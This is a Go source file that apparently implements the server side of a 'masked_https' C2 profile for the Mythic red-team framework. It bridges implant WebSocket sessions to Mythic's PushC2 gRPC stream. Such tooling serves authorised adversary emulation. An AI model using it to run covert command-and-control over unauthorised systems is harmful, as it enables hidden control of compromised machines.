package main

import (
	"context"
	"fmt"
	"log"
	"net"
	"strings"
	"sync"

	mythicGRPC "github.com/MythicMeta/MythicContainer/grpc"
	"github.com/MythicMeta/MythicContainer/grpc/services"
	"github.com/google/uuid"
	"github.com/gorilla/websocket"
	"google.golang.org/grpc"
)

// pushSession 负责把单个 WSS 连接和单个 Mythic PushC2 stream 绑定在一起。
// 这里采用 one-to-one 模式，避免额外的多路复用复杂度。
type pushSession struct {
	websocketConn *websocket.Conn
	grpcConn      *grpc.ClientConn
	grpcStream    services.PushC2_StartPushC2StreamingClient
	cancel        context.CancelFunc
	trackingID    string
	remoteIP      string
	closeOnce     sync.Once
}

func handlePushWebsocket(conn *websocket.Conn) {
	session, err := newPushSession(conn)
	if err != nil {
		log.Printf("建立 push session 失败: %v", err)
		_ = conn.Close()
		return
	}
	session.run()
}

func newPushSession(conn *websocket.Conn) (*pushSession, error) {
	grpcConn := mythicGRPC.GetNewPushC2ClientConnection()
	pushClient := services.NewPushC2Client(grpcConn)
	ctx, cancel := context.WithCancel(context.Background())
	stream, err := pushClient.StartPushC2Streaming(ctx)
	if err != nil {
		cancel()
		_ = grpcConn.Close()
		return nil, fmt.Errorf("启动 PushC2 stream 失败: %w", err)
	}
	return &pushSession{
		websocketConn: conn,
		grpcConn:      grpcConn,
		grpcStream:    stream,
		cancel:        cancel,
		trackingID:    uuid.NewString(),
		remoteIP:      remoteHost(conn.RemoteAddr()),
	}, nil
}

func (s *pushSession) run() {
	log.Printf("push session 建立: tracking_id=%s remote=%s", s.trackingID, s.remoteIP)
	closed := make(chan struct{}, 2)
	go s.websocketToMythic(closed)
	go s.mythicToWebsocket(closed)
	<-closed
	<-closed
	s.shutdown(false)
	log.Printf("push session 关闭: tracking_id=%s", s.trackingID)
}

func (s *pushSession) websocketToMythic(closed chan<- struct{}) {
	defer func() {
		s.shutdown(true)
		closed <- struct{}{}
	}()
	for {
		var envelope websocketEnvelope
		if err := s.websocketConn.ReadJSON(&envelope); err != nil {
			log.Printf("push session 读取 agent websocket 失败 tracking_id=%s err=%v", s.trackingID, err)
			return
		}
		if strings.TrimSpace(envelope.Data) == "" {
			continue
		}
		if err := s.grpcStream.Send(&services.PushC2MessageFromAgent{
			C2ProfileName: "masked_https",
			RemoteIP:      s.remoteIP,
			Base64Message: []byte(envelope.Data),
			TrackingID:    s.trackingID,
		}); err != nil {
			log.Printf("push session 转发 agent->mythic 失败 tracking_id=%s err=%v", s.trackingID, err)
			return
		}
	}
}

func (s *pushSession) mythicToWebsocket(closed chan<- struct{}) {
	defer func() {
		s.shutdown(false)
		closed <- struct{}{}
	}()
	for {
		message, err := s.grpcStream.Recv()
		if err != nil {
			log.Printf("push session 读取 mythic stream 失败 tracking_id=%s err=%v", s.trackingID, err)
			return
		}
		log.Printf("push session 收到 mythic 下推 tracking_id=%s success=%t bytes=%d", s.trackingID, message.GetSuccess(), len(message.GetMessage()))
		if !message.GetSuccess() && strings.TrimSpace(message.GetError()) != "" {
			log.Printf("push session 收到 mythic 错误 tracking_id=%s err=%s", s.trackingID, message.GetError())
			continue
		}
		if len(message.GetMessage()) == 0 {
			continue
		}
		reply := websocketEnvelope{
			Client: false,
			Data:   string(message.GetMessage()),
			Tag:    firstNonEmpty(strings.TrimSpace(message.GetTrackingID()), s.trackingID),
		}
		if err := s.websocketConn.WriteJSON(reply); err != nil {
			log.Printf("push session 转发 mythic->agent 失败 tracking_id=%s err=%v", s.trackingID, err)
			return
		}
	}
}

func (s *pushSession) shutdown(agentDisconnected bool) {
	s.closeOnce.Do(func() {
		if agentDisconnected {
			_ = s.grpcStream.Send(&services.PushC2MessageFromAgent{
				C2ProfileName:     "masked_https",
				RemoteIP:          s.remoteIP,
				TrackingID:        s.trackingID,
				AgentDisconnected: true,
			})
		}
		s.cancel()
		_ = s.grpcStream.CloseSend()
		_ = s.websocketConn.Close()
		_ = s.grpcConn.Close()
	})
}

func remoteHost(addr net.Addr) string {
	if addr == nil {
		return ""
	}
	host, _, err := net.SplitHostPort(strings.TrimSpace(addr.String()))
	if err == nil {
		return host
	}
	return strings.TrimSpace(addr.String())
}

func firstNonEmpty(values ...string) string {
	for _, value := range values {
		if strings.TrimSpace(value) != "" {
			return strings.TrimSpace(value)
		}
	}
	return ""
}
